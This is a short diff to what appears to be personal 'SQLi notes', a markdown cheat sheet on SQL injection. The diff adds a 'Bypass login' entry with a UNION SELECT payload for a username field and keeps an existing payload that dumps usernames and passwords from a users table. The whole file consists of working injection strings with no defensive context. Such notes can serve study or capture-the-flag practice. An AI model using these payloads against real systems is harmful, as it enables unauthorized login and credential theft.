@@ -1,5 +1,8 @@
 # SQLi notes
 
+#### Bypass login
+`admin' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1` in username field and than `pass` in password field
+
 #### To jump to other tables:
 `' UNION SELECT username, password FROM users--`
 
